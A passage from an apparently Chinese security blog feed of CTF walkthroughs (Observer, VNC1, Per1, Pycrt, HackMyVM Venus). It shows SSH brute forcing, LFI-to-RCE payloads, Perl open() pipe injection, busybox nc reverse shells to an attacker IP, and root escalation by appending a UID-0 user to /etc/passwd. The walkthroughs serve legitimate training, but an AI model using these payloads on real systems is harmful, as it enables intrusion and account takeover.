192.168.205.131 Observer.nlx
```

## 2. Web信息枚举

访问 `http://Observer.nlx`，网站是一个静态的网页模板。在对网站目录进行爆破后未发现敏感文件，但在主页`index.html`的源码中，“Our Team”部分发现了几个可疑的用户名。


![image-20250810130421280](http://7r1UMPHK.github.io/image/20250810130421538.webp)

从源码中，我们提取到以下潜在用户名：
*   **john**
*   **mike**
*   **remo**
*   **niscal**

# 三、主机渗透与立足点

## 1. SSH爆破

利用上一步发现的用户名列表，结合弱口令字典，对SSH服务进行爆破攻击。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat user.txt
john
mike
remo
niscal

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -L user.txt -P /path/to/passwords.txt ssh://192.168.205.131 -t 64
...
[22][ssh] host: 192.168.205.131   login: niscal   password: niscal
...
```

成功爆破出用户 `niscal` 的密码为 `niscal`。

## 2. 受限Shell绕过

尝试使用获取的凭证登录SSH。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh niscal@192.168.205.131
niscal@192.168.205.131's password: 

########################################
# Dear person,                         #
# Not now! I'm busy with the terminal. #
# by Niscal                            #
########################################

Connection to 192.168.205.131 closed.
```

登录后连接立即被关闭，并显示一条关键信息 **'I'm busy with the terminal.'**。这强烈暗示当前登录的会话不被认为是“真正的终端”，因此被限制脚本拒绝。

## 3. X11转发攻击

根据提示，我们尝试使用SSH的X11转发功能 (`-X` 或 `-Y`) 来请求一个图形化会话，这很可能绕过限制脚本。

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -X niscal@192.168.205.131 
niscal@192.168.205.131's password: 
...
```

![image-20250810125226283](http://7r1UMPHK.github.io/image/20250810125233587.webp)

成功显示，并且显示了下面内容。

```
niscal@observer:~$ echo -n REMOisGOD | passwd remo
```

经过尝试该X11 shell在输入命令回车就会断开。

# 四、权限提升

## 1. 横向移动 (niscal -&gt; remo)

使用显示的用户名`remo`和密码`REMOisGOD`进行登录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh remo@192.168.205.131
remo@192.168.205.131's password: 
...
remo@observer:~$ id
uid=1001(remo) gid=1001(remo) groups=1001(remo)
```

成功切换到 `remo` 用户。

## 2. 提权至root

在 `remo` 用户下进行信息收集，检查环境变量时发现了一个重大线索。

```bash
remo@observer:~$ env
...
rootKEY=LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K... (此处省略了超长的Base64字符串)
...
```

环境变量 `rootKEY` 包含一个Base64编码的字符串，看起来像是一个SSH私钥。我们将其解码并保存。

```bash
remo@observer:~$ echo 'LS0tLS1...LS0tCg==' | base64 -d &gt; id_rsa
remo@observer:~$ chmod 600 id_rsa
```

使用这个私钥尝试以 `root` 用户身份登录本地SSH服务。

```bash
remo@observer:~$ ssh root@127.0.0.1 -i id_rsa
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
root@observer:~# id
uid=0(root) gid=0(root) groups=0(root)
```

成功提权至 `root` 用户！

# 五、获取Flag

现在我们拥有了所有权限，可以读取所有的Flag。

```bash
root@observer:~# cat /root/root.txt
fa40a17de09827a5ae20a894304c6a49

root@observer:~# cat /home/remo/user.txt 
f2edafebb9851d806ff15deb0477ebe8
```

所有Flag均已找到，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/vulnyx_Observer.html</guid><pubDate>Sun, 10 Aug 2025 05:15:37 +0000</pubDate></item><item><title>内部_VNC1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_VNC1.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先在本地网络中使用 `arp-scan` 发现目标主机IP，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.140 08:00:27:23:44:a3       PCS Systemtechnik GmbH
...
```

**端口扫描:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.140
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5901/tcp open  vnc-1
...
```

扫描结果表明，目标主机IP为 `192.168.205.140`，开放了 **22 (SSH)**、**80 (HTTP)** 和 **5901 (VNC)** 端口。

**VNC服务侦察:**
对5901端口进行详细的服务扫描，确认其为VNC服务，并支持标准的密码认证，这为后续的横向移动提供了潜在的攻击面。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p5901 -sV -sC 192.168.205.140
...
PORT     STATE SERVICE VERSION
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
...
```

# **二、漏洞发现与初始访问**

## **1. Web服务LFI漏洞**

访问80端口，发现是一个LFI漏洞的测试页面。通过 `file` 参数可以包含任意文件。

**验证LFI漏洞:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.140/index.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
todd:x:1000:1000:,,,:/home/todd:/bin/bash
...
```

成功读取 `/etc/passwd` 文件，确认了LFI漏洞的存在。

## **2. LFI Bypass `disable_functions` RCE**

通过`php://filter`读取`phpinfo`发现，目标PHP环境禁用了 `system`, `passthru`, `shell_exec` 等常用命令执行函数，导致传统的LFI to RCE方法失效。

```
disable_functions	system,passthru,shell_exec,proc_open,pcntl_exec,dl
```

然而，我们可以换一个常用命令执行函数，最终绕过`disable_functions`的限制来执行代码。

我们使用 `php_filter_chain_generator` 工具来生成能够执行 `exec($_GET['0']);` 的Payload。

&gt; https://github.com/synacktiv/php_filter_chain_generator

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
└─$ python3 php_filter_chain_generator.py --chain '&lt;?php exec($_GET['0']); ?&gt;'

[+] The following gadget chain will generate the following code : &lt;?php exec($_GET['0']); ?&gt;
php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp
```

## **3. 获取 www-data Shell**

将生成的Payload附加到URL中，并通过 `0` 参数传递反弹shell命令，在本地开启监听，成功获取 `www-data` 用户的交互式Shell。

**本地监听:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
└─$ nc -lvnp 8888
```

**执行Payload获取Shell:**
(将 `[CHAIN]` 替换为上面工具生成的完整过滤器链)

```bash
http://192.168.205.140/index.php?file=[CHAIN]&amp;0=busybox nc 192.168.205.128 8888 -e /bin/bash
```

**获取Shell并稳定TTY:**

```bash
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.140] 48454
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 使用 script 稳定Shell
script /dev/null -c bash
# 使用 Ctrl+Z 将其置于后台，然后使用 stty 修复终端
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **三、权限提升**

## **1. www-data -&gt; todd (横向移动)**

在 `www-data` shell中进行信息搜集，在用户 `todd` 的家目录下发现了一个全局可读的VNC密码备份文件。

```bash
www-data@VNC1:/home/todd/.vnc$ ls -al
...
-rw-r--r--  1 root root      8 Jul 28 22:05 passwd.bak
...
www-data@VNC1:/home/todd/.vnc$ base64 passwd.bak 
QMypcY/7jpE=
```

这是一个典型的错误配置。我们将这个Base64编码的密码哈希复制到本地进行破解。我们使用 `vncpwd` 工具，该工具专门用于解密这类VNC密码文件。

**在Kali上破解VNC密码:**

```bash
# 克隆并编译工具
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ git clone https://github.com/jeroennijhof/vncpwd.git
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd vncpwd &amp;&amp; make

# 将从目标机获取的base64字符串解码回文件
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/vncpwd]
└─$ echo 'QMypcY/7jpE=' |base64 -d &gt; passwd

# 执行解密
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/vncpwd]
└─$ ./vncpwd passwd                        
Password: vncpassw
```

成功解密出VNC密码为 `vncpassw`。使用 `vncviewer` 和此密码连接到目标的5901端口（这里需要图形化桌面）。

```bash
┌──(kali㉿kali)-[~]
└─$ vncviewer 192.168.205.140:1
...
Password: vncpassw
Authentication successful
...
```

成功登录，获取 `todd` 用户的图形化桌面会话。在该用户家目录下找到第一个flag。

```bash
www-data@VNC1:/home/todd$ cat user.txt 
12f54a96f64443246930da001cafda8b
```

## **2. todd -&gt; root (垂直提权)**

在 `todd` 用户的会话中进行提权信息搜集。首先检查文件的特殊能力（Capabilities）。

```bash
todd@VNC1:~$ getcap -r / 2&gt;/dev/null
...
/home/todd/Videos/python3.9 = cap_fowner+ep
```

发现一个位于用户家目录下的 `python3.9` 可执行文件被赋予了 `cap_fowner` 能力。该能力允许进程**无视文件权限**，更改文件的所有者和**权限**。

直接利用该能力 `setuid(0)` 的尝试失败了。

```bash
todd@VNC1:~$ /home/todd/Videos/python3.9 -c 'import os; os.setuid(0); os.system('/bin/sh')'
PermissionError: [Errno 1] Operation not permitted
```

但是，`chmod` 操作并未被限制。因此，我们可以利用此能力将 `/etc/passwd` 文件变为全局可写，然后添加一个UID为0的新用户来实现提权。

**利用`cap_fowner`修改`/etc/passwd`权限:**

```bash
todd@VNC1:~$ /home/todd/Videos/python3.9 -c 'import os; os.chmod('/etc/passwd', 0o777)'
todd@VNC1:~$ ls -al /etc/passwd
-rwxrwxrwx 1 root root 1853 Jul 28 10:17 /etc/passwd
```

成功修改权限。现在，我们向 `/etc/passwd` 文件中追加一个新用户 `b`，其UID和GID均为0，密码为 `abcdefg` (使用`$1$`的MD5哈希)。

```bash
todd@VNC1:~$ echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' &gt;&gt; /etc/passwd
```

**切换用户并获取最终Flag:**

```bash
todd@VNC1:~$ su b
Password: abcdefg
root@VNC1:~# id
uid=0(root) gid=0(root) groups=0(root)
root@VNC1:~# cat /root/root.txt /home/todd/user.txt 
flag{root-60b725f10c9c85c70d97880dfe8191b3}
12f54a96f64443246930da001cafda8b
```

至此，成功获取root权限，靶机完全攻破。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_VNC1.html</guid><pubDate>Sat, 09 Aug 2025 14:04:12 +0000</pubDate></item><item><title>内部_Per1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Per1.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先在本地网络中使用 `arp-scan` 发现目标主机IP，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l       
...
192.168.205.139 08:00:27:82:44:3a       PCS Systemtechnik GmbH
...
```

**端口扫描:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.139
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

扫描结果表明，目标主机IP为 `192.168.205.139`，开放了 **22 (SSH)** 和 **80 (HTTP)** 端口。

## **2. Web服务侦察**

访问80端口，发现是一个关于Perl语言的静态页面。查看页面源代码，在其中发现一条关键线索。

```html
...
&lt;div&gt;&lt;!-- cgi --&gt;&lt;/div&gt;
...
```

HTML注释中出现的 `cgi` 强烈暗示Web服务上可能存在CGI脚本，这通常是Web应用的一个重要攻击面。

# **二、漏洞发现与初始访问**

## **1. CGI目录与文件扫描**

根据上一步的线索，我们重点对CGI相关目录进行扫描。使用 `gobuster` 对 `/cgi-bin/` 目录进行深度扫描，成功发现一个可疑的CGI脚本。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.139/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x cgi,pl -t 64
...
/file.cgi             (Status: 200) [Size: 22]
...
```

扫描找到了 `file.cgi` 文件，这是我们的主要突破口。

## **2. LFI 到 RCE (Perl `open` 函数漏洞)**

对发现的 `file.cgi` 进行参数模糊测试，发现一个 `file` 参数存在本地文件包含 (LFI) 漏洞。

**验证LFI漏洞:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl '192.168.205.139/cgi-bin/file.cgi?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
sunset:x:1001:1001:,,,:/home/sunset:/bin/bash
```

成功读取 `/etc/passwd` 文件。利用此漏洞读取 `file.cgi` 自身的源代码。

**源码审计:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl '192.168.205.139/cgi-bin/file.cgi?file=file.cgi'   
#!/usr/bin/perl
use CGI;
print CGI::header();
my $input = CGI::param('file');
if($input) {
    open(FILE, $input);
    print while &lt;FILE&gt;;
    close(FILE);
}
else {
    print 'Missing file parameter';
}
```

源码的核心问题在于 `open(FILE, $input);`。在Perl中，这种双参数的 `open` 函数非常危险。当传递的参数以管道符 `|` 结尾时，Perl会将其后的字符串作为命令来执行。这使我们能够将LFI漏洞直接升级为远程代码执行 (RCE) 漏洞。

## **3. 获取 www-data Shell**

**验证RCE漏洞:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl '192.168.205.139/cgi-bin/file.cgi?file=id|'     
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功执行 `id` 命令。接下来，构造反弹Shell的Payload，在本地开启监听，成功获取 `www-data` 用户的交互式Shell。

**本地监听:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
```

**构造并执行Payload:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl '192.168.205.139/cgi-bin/file.cgi?file=busybox+nc+192.168.205.128+8888+-e+/bin/bash|'
```

**获取Shell并稳定TTY:**

```bash
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.139] 37298
# 使用 script 稳定Shell
script /dev/null -c bash
# 使用 Ctrl+Z 将其置于后台，然后使用 stty 修复终端
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **三、权限提升**

## **1. www-data -&gt; sunset**

在获取 `www-data` 权限后，对系统进行信息搜集。在 `/opt` 目录下发现一个可疑的Perl脚本 `password.pl`。

```bash
www-data@Per1:/opt$ ls -al
...
-rwxr-xr-x  1 sunset sunset  893 Aug  8 09:07 password.pl
```

该脚本属于 `sunset` 用户。执行此脚本，得到一个字符串。

```bash
www-data@Per1:/opt$ perl password.pl 
dylan4
```

这很可能是 `sunset` 用户的密码。使用 `su` 命令和该密码进行尝试。

```bash
www-data@Per1:/opt$ su sunset
Password: dylan4
sunset@Per1:/opt$ id
uid=1001(sunset) gid=1001(sunset) groups=1001(sunset)
```

成功切换到 `sunset` 用户。在此用户家目录下找到第一个flag。

```bash
sunset@Per1:/opt$ cat /home/sunset/user.txt
flag{user-5b5b8e9b01ef27a1cc0a2d5fa87d7190}
```

## **2. sunset -&gt; root **

获取 `sunset` 权限后，立刻检查其 `sudo` 权限。

```bash
sunset@Per1:/opt$ sudo -l
...
User sunset may run the following commands on Per1:
    (ALL) NOPASSWD: /usr/bin/python /usr/bin/guess_game.py
```

`sunset` 用户可以免密以 `root` 权限运行 `/usr/bin/guess_game.py` 脚本。查看该脚本源码。

```bash
sunset@Per1:/opt$ cat /usr/bin/guess_game.py
import random

def guess_game():
    ...
    try:
        user_input = input('Your guess: ')  
    except Exception as e:
        print 'Error:', e
        return
    ...
```

此脚本使用 `python` (即Python 2) 执行，并且在代码中使用了极其危险的 `input()` 函数。在Python 2中，`input()` 会将用户的输入当作Python代码来执行。因此，我们可以输入一段能够启动shell的Python代码，该代码将以 `root` 权限执行。

**构造并执行提权Payload:**

```bash
sunset@Per1:/opt$ sudo /usr/bin/python /usr/bin/guess_game.py
Welcome to the guess game!
I've chosen a number between 0 and 65535.
Your guess: __import__('os').system('/bin/bash')
```

输入Payload后，成功获取 `root` 权限的shell。

**获取最终Flag:**

```bash
root@Per1:/opt# id
uid=0(root) gid=0(root) groups=0(root)
root@Per1:/opt# cat /root/root.txt /home/sunset/user.txt 
flag{root-c27679de03aba03c5a33159aef11f8ea}
flag{user-5b5b8e9b01ef27a1cc0a2d5fa87d7190}
```

至此，靶机完全攻破。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Per1.html</guid><pubDate>Sat, 09 Aug 2025 14:03:53 +0000</pubDate></item><item><title>内部_Pycrt</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Pycrt.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先在本地网络中使用 `arp-scan` 确定目标主机的IP地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:75:0e:4e       PCS Systemtechnik GmbH
...
```

**端口扫描:**

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.131
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6667/tcp open  irc
...
```

扫描结果表明，目标主机IP为 `192.168.205.131`，开放了 **22 (SSH)**、**80 (HTTP)** 和 **6667 (IRC)** 端口。

## **2. 服务侦察**

* **HTTP (80端口):** 访问该端口发现是 Apache2 的默认欢迎页面，没有直接可利用的信息。

* **IRC (6667端口):** 这是关键的突破口。使用 `irssi` 客户端连接到该服务。

  ```bash
  irssi -c 192.168.205.131 -p 6667
  ```

  在连接后的服务器欢迎信息 (MOTD) 中，发现一条至关重要的线索：

  &gt; `...issues ShadowSec directory...`
  &gt; 这强烈暗示Web服务上可能存在一个名为 `ShadowSec` 的目录。

# **二、漏洞发现与初始访问**

## **1. Web目录与代码审计**

根据 IRC 服务提供的线索，访问 `http://192.168.205.131/ShadowSec/`，发现一个静态页面。对该目录进行深度扫描，发现一个隐藏的文件 `bydataset.php`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.131/ShadowSec/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,zip,db,bak -t 64 
...
/bydataset.php        (Status: 200)
...
```

# **2. LFI 到 RCE**

通过对 `bydataset.php` 进行参数模糊测试，发现一个 `file` 参数存在本地文件包含 (LFI) 漏洞。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.131/ShadowSec/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,zip,db,bak -t 64 
...
file                    [Status: 200, Size: 1452, Words: 13, Lines: 28, Duration: 14ms]
...

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131/ShadowSec/bydataset.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

利用该LFI漏洞，读取 `bydataset.php` 文件自身的源代码，发现其包含一个后门。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131/ShadowSec/bydataset.php?file=bydataset.php'
```

源码审计结果如下：

*   当接收到 **POST** 请求时。
*   需要一个 `auth` 参数，其值必须为硬编码的 `'LetMeIn123!'`。
*   接收一个 `payload` 参数，该参数经过 `strrev()` (字符串反转) 和 `base64_decode()` 解码后，如果以 `cmd:` 开头，则其后的内容会被 `exec()` 函数执行。

这是一个典型的、精心构造的远程代码执行 (RCE) 漏洞。

## **3. 获取 www-data Shell**

根据源码逻辑，构造我们的Payload。

1.  **目标命令:** `id`
2.  **构造字符串:** `cmd:id`
3.  **Base64编码:** `Y21kOmlk`
4.  **字符串反转:** `klimDk12Y`

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
└─$ echo -n 'cmd:id' | base64 -w0 | rev  
klmOk12Y 
```

使用 `curl` 发送构造好的POST请求，成功验证RCE。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -X POST --data 'auth=LetMeIn123!' --data-urlencode 'payload=klmOk12Y' http://192.168.205.131/ShadowSec/bydataset.php
&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/pre&gt;
```

接下来，构造反弹Shell的Payload，在本地Kali开启监听后，成功获取 `www-data` 用户的交互式Shell。

**本地监听:**

```bash
nc -lvnp 8888
```

**构造并执行Payload:**

```bash
# Payload: rev(base64('cmd:busybox nc 192.168.205.128 8888 -e /bin/bash'))
curl -X POST --data 'auth=LetMeIn123!' --data-urlencode 'payload=oNXY...' http://...
```

# **三、权限提升**

## **1. www-data -&gt; chatlake**

获取初步Shell后，执行 `sudo -l` 查看当前用户的 `sudo` 权限。

```bash
www-data@PyCrt:/tmp$ sudo -l
...
User www-data may run the following commands on PyCrt:
    (chatlake) NOPASSWD: /usr/bin/weechat
```

发现 `www-data` 用户可以以 `chatlake` 用户的身份，免密运行终端IRC客户端 `weechat`。这是一个提权路径。

1. 首先稳定当前shell，使其成为一个功能完整的TTY。

2. 执行提权命令，启动`weechat`。

   ```bash
   sudo -u chatlake /usr/bin/weechat
   ```

3. 在 `weechat` 客户端内部，利用其 `/exec` 功能执行命令，反弹一个新的shell。

   ```
   /exec busybox nc 192.168.205.128 9999 -e /bin/bash
   ```

4. 在本地 `9999` 端口成功接收到 `chatlake` 用户的shell。

## **2. chatlake -&gt; pycrtlake**

获取 `chatlake` 权限后，再次执行 `sudo -l`。

```bash
chatlake@PyCrt:~$ sudo -l
...
User chatlake may run the following commands on PyCrt:
    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service
```

`chatlake` 可以免密启动一个名为 `irc_bot.service` 的服务。检查该服务文件发现，它会以 `pycrtlake` 用户身份运行一个Python脚本 `/usr/local/bin/irc_bot.py`，且我们无法直接修改这两个文件。

这表明提权需要与这个IRC机器人进行交互。

1.  首先，启动该服务：`sudo /usr/bin/systemctl start irc_bot.service`。
2.  使用 `weechat` 客户端连接到本地 `6667` 端口，并加入频道。

```
/server add x localhost/6667
/connect x
/LIST
         │00:56:17       x  -- | End of message of the day.
         │00:56:46       x  -- | Channel Users Name
         │00:56:46       x  -- | #chan2(1): [+nt]
         │00:56:46       x  -- | #chan3(1): [+nt]
         │00:56:46       x  -- | #chan4(1): [+nt]
         │00:56:46       x  -- | #chan5(1): [+nt]
         │00:56:46       x  -- | #chan6(1): [+nt]
         │00:56:46       x  -- | #chan1(1): [+nt]
```

3.  在频道6中，一个名为 `@admin` 的机器人提示需要遵循“格式要求”，并以 `:)` 结尾。
4.  **发现漏洞利用条件：** 与机器人交互后发现，其存在一个复杂的触发机制：
    - **格式要求：** 命令内容必须是**以空格分隔的ASCII十进制编码**，并以 :) 结尾。在测试中发现，机器人会拒绝所有包含字母的直接命令，但接受纯数字输入，这强烈暗示了需要进行编码转换。
    - **用户名要求：** 必须将自己的昵称更改为 ll104567 (/nick ll104567)，否则机器人会拒绝执行命令。
    - **交互逻辑：** 构造好的命令需要发送到 #chan1 公共频道，但命令的执行结果会由机器人 @admin **私聊**回显。

5. 根据以上条件，构造反弹shell的ASCII码payload，并在#chan1频道发送。
6. 在监听端口成功接收到 pycrtlake 用户的shell。

## **3. pycrtlake -&gt; root**

这是最后一步提权。在 `pycrtlake` shell中执行 `sudo -l`。

```bash
pycrtlake@PyCrt:~$ sudo -l
...
User pycrtlake may run the following commands on PyCrt:
    (ALL) NOPASSWD: /usr/bin/gtkwave
```

`pycrtlake` 用户可以免密以 `root` 身份运行GUI程序 `gtkwave`。

1. 直接运行会因缺少 `DISPLAY` 环境变量而失败。

2. 该程序的 `-W` 命令行模式也因同样原因无法直接使用。

3. **最终解决方案：** 使用 **Xvfb (X Virtual Framebuffer)** 创建一个虚拟的图形环境来欺骗 `gtkwave`。

4. 首先，在 `/tmp` 目录启动一个虚拟显示服务。

   ```bash
   Xvfb :1 &amp;
   ```

5. 利用 `gtkwave` 的 `-W` (wish) 参数，在指定的虚拟显示环境中启动一个拥有 `root` 权限的Tcl交互式命令行。

   ```bash
   sudo DISPLAY=:1 /usr/bin/gtkwave -W
   ```

6. 命令执行后，会得到一个Tcl的提示符 `%`。在这个 `root` 权限的shell中，可以直接读取 `root` 目录下的最终flag。

   ```tcl
   % id
   uid=0(root) gid=0(root) groups=0(root)
   % cat /root/root.txt /home/chatlake/user.txt
   flag{e80ecc46ca5e00bf8a51c47f0cc3e868}
   flag{b42baba466402e32157a1cbba819664e}
   ```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Pycrt.html</guid><pubDate>Sat, 09 Aug 2025 06:02:46 +0000</pubDate></item><item><title>hmv_Labs_venus31to40</title><link>https://7r1UMPHK.github.io/post/hmv_Labs_venus31to40.html</link><description># **Mission 0x31: kira -&gt; veronica**

- **任务**: 用户 `veronica` 经常访问 `http://localhost/waiting.php`。

1. 使用 `curl` 访问该页面，会收到一条信息，提示服务器正在等待一个特定的 User-Agent。

   ```bash
   kira@venus:~$ curl http://localhost/waiting.php
   Im waiting for the user-agent PARADISE. 
   ```

2. 根据提示，在 `curl` 请求中通过 `-H` 参数设置 `User-Agent` 为 `PARADISE`，成功获取密码。

   ```bash
   kira@venus:~$ curl -H 'User-Agent: PARADISE' http://localhost/waiting.php
   QTOel6BodTx2cwX 
   ```

3. **veronica 的密码**: `QTOel6BodTx2cwX`

# **Mission 0x32: veronica -&gt; lana**

- **任务**: 用户 `veronica` 为 `lana` 的密码创建了一个别名 (alias)。

1. 在 `veronica` 的会话中，使用 `alias` 命令可以列出所有已定义的别名。

   ```bash
   veronica@venus:~$ alias
   alias lanapass='UWbc0zNEVVops1v'
   alias ls='ls --color=auto'
   ```

2. 名为 `lanapass` 的别名直接暴露了 `lana` 的密码。

3. **lana 的密码**: `UWbc0zNEVVops1v`

# **Mission 0x33: lana -&gt; noa**

- **任务**: 用户 `noa` 喜欢压缩她的东西。

1. 在家目录中发现一个名为 `zip.gz` 的文件。尽管后缀是 `.gz`，但使用 `file` 命令检查发现它实际上是一个 `tar` 归档文件。（Labs不许解压在该机器，所以需要你自己想办法拉去本地，可以使用bsae64复制拉取）

2. 将其解压后，会得到一个名为 `zip` 的文件，其中包含了密码。

   ```bash
   # 在本地机器上操作
   $ file zip.gz
   zip.gz: POSIX tar archive (GNU)
   $ tar -xvf zip.gz
   pwned/lana/zip
   $ cat pwned/lana/zip 
   9WWOPoeJrq6ncvJ
   ```

3. **noa 的密码**: `9WWOPoeJrq6ncvJ`

# **Mission 0x34: noa -&gt; maia**

- **任务**: `maia` 的密码被“垃圾”包围着。

1. 在家目录中有一个名为 `trash` 的文件，里面充满了随机的“垃圾”数据。

2. 使用 `strings` 命令可以从二进制文件中提取可打印的字符串，从而在垃圾数据中找到真正的密码。

   ```bash
   noa@venus:~$ strings trash
   ...
   \nh1hnDPHpydEjoEN
   ...
   ```

3. **maia 的密码**: `h1hnDPHpydEjoEN`

# **Mission 0x35: maia -&gt; gloria**

- **任务**: `gloria` 忘记了她密码的最后两个字符，只记得是两个小写字母。

1. 名为 `forget` 的文件给出了密码的已知部分：`v7xUVE2e5bjUc??`。

2. 这是一个典型的暴力破解场景。可以编写一个脚本生成所有可能的小写字母组合（从 `aa` 到 `zz`），然后使用 `hydra` 等工具对 `gloria` 的 SSH 服务进行密码爆破。

   ```bash
   for a in {a..z}; do for b in {a..z}; do echo 'v7xUVE2e5bjUc${a}${b}'; done; done |tac &gt; pass
   ```

3. 最终找到的正确密码是 `v7xUVE2e5bjUcxw`。

# **Mission 0x36: gloria -&gt; alora**

- **任务**: `alora` 喜欢画画，所以她把密码存成了一幅“画”。

1.  家目录下的 `image` 文件内容是一大片由 `#` 字符组成的 ASCII 艺术。
2.  这幅“画”实际上是一个二维码 (QR Code)。使用手机或在线二维码扫描工具扫描即可得到密码。
3.  **alora 的密码**: `mhrTFCoxGoqUxtw`

# **Mission 0x37: alora -&gt; julie**

- **任务**: 用户 `julie` 创建了一个包含她密码的 ISO 文件。

1. 在家目录中找到 `music.iso` 文件。可以直接使用 `strings` 命令在文件中查找可疑的密码字符串。

   ```bash
   alora@venus:~$ strings music.iso
   ...
   sjDf4i2MSNgSvOv
   ...
   ```

2. **julie 的密码**: `sjDf4i2MSNgSvOv`

# **Mission 0x38: julie -&gt; irene**

- **任务**: `irene` 相信“美在于不同”。

1. 家目录下有两个文件：`1.txt` 和 `2.txt`。这个提示暗示需要找出它们之间的差异。

2. 使用 `diff` 命令比较这两个文件。

   ```bash
   julie@venus:~$ diff 1.txt 2.txt
   174c174
   &lt; 8VeRLEFkBpe2DSD
   ---
   &gt; aNHRdohjOiNizlU
   ```

3. 差异之处显示了两行不同的字符串，其中一个是密码。经过尝试，`8VeRLEFkBpe2DSD` 是正确的密码。

4. **irene 的密码**: `8VeRLEFkBpe2DSD`

# **Mission 0x39: irene -&gt; adela**

- **任务**: `adela` 把她的密码借给了 `irene`。

1. `irene` 的家目录下有一个加密文件 `pass.enc` 和一个私钥文件 `id_rsa.pem`。

2. 这表明密码是使用 RSA 加密的。使用 `openssl` 和给定的私钥可以解密文件内容。

   ```bash
   irene@venus:~$ openssl rsautl -decrypt -inkey id_rsa.pem -in pass.enc
   nbhlQyKuaXGojHx
   ```

